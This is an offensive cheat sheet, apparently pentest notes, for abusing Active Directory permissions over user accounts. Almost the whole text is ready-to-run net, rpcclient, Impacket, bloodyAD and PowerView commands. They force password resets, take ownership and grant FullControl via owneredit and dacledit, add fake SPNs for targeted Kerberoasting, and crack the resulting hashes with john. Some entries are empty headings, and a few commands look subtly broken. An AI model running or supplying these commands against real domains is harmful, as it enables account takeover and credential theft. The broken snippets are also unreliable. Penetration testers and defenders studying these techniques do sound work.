# ACLs/ACEs permissions on User

### ForceChangePassword

#### 1) Net (Windows)

    net user TARGET_USER PASSWORD /domain (Windows)

#### 2) Net (Linux)

    net rpc password TARGET_USER PASSWORD -S DC_FQDN -U domain.local/USER1%'Password@1'
    
#### 3) Impacket

    impacket-changepasswd domain.local/TARGET_USER@DC_IP -newpass Password@1234 -altuser domain.local/USER1 -altpass Password@1 -reset

Impacket’s changepassword can also be used to change current user password, if current password is known.

    impacket-changepasswd domain.local/TARGET_USER@DC_IP -newpass ‘Password@987’ -p rpc-samr

### GenericAll / GenericWrite

#### 1) Windows net command

Change the password of a user

    net user USER PASSWORD /domain

#### 2) Linux Net RPC - Samba 

    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP   

#### 3) BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@9876"

#### 4) Rpcclient

    rpcclient -U domain.local/USER1 DC_IP
    rpcclient $> setuserinfo TARGET_USER 23 "Password@9876"

#### 5) Targeted Kerberoasting (add SPN)

    targetedKerberoast.py -d DOMAIN -u USER -p PASS (TGS Hash)

 ### Alternate method: Powerview

#### 1) Enumerate interesting ACLs with powerview

    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "OUR_USER"} 

#### Then:

    Set-DomainObject -Identity TARGET_USER -SET @(serviceprincipalname='nonexistent/WHATEVER') (Powerview)

    Get-DomainSPNTicket -SPN nonexistent/WHATEVER (Powerview)

#### 6) Logon Script (Access)

#### 7) add Key Credentials (Shadow Credentials)

#### 8) Powerview

    $SecPassword = ConvertTo-SecureString 'Password@987' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('domain.local\TARGET_USER', $SecPassword)

#### 9) Windows PowerShell

    $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword

### AllExtendedRights

#### 1) Linux Net RPC - Samba

    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP

#### 2) BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@987"

#### 3) Rpcclient

    rpcclient -U domain.local/USER1 DC_IP
    rpcclient $> setuserinfo TARGET_USER 23 Ignite@987

#### 4) Powerview

    powershell -ep bypass
    Import-Module .\PowerView.ps1
    $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword

### WriteOwner  /WriteDacl

#### 1) impacket-owneredit

Grant Ownership (owneredit), then assign Full Control (dacledit), then perform Kerberoasting or Password Change attacks (ForceChangePassword).

    impacket-owneredit -action write -new-owner 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP

#### 2) impacket-dacledit

    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'USER1' -target-dn 'CN=TARGET_USER,CN=Users,DC=domain,DC=local' 'domain.local'/'USER1':'Password@1' -dc-ip DC_IP

Then, you can do targeted Kerberoasting for example

    python3 targetedKerberoast.py --dc-ip 'DC_IP' -v -d 'domain.local' -u 'USER1' -p 'Password@1'

Crack hash

    john -w=/usr/share/wordlists/rockyou.txt hash

OR you can change the TARGET_USER's password

    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP

BloodyAD

    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@987"

#### 3) Powerview

    powershell -ep bypass
    Import-Module .PowerView.ps1
    Set-DomainObjectOwner -Identity 'TARGET_USER' -OwnerIdentity 'USER1'
    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "TARGET_USER" -PrincipalIdentity "USER1"

Now, do Kerberoast from a Windows Machine instead

    Set-DomainObject -Identity 'TARGET_USER' -Set @{serviceprincipalname='nonexistent/hacking'}
    Get-DomainUser 'TARGET_USER' | Select serviceprincipalname
    $User = Get-DomainUser 'TARGET_USER'
    $User | Get-DomainSPNTicket

OR change password

    $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword
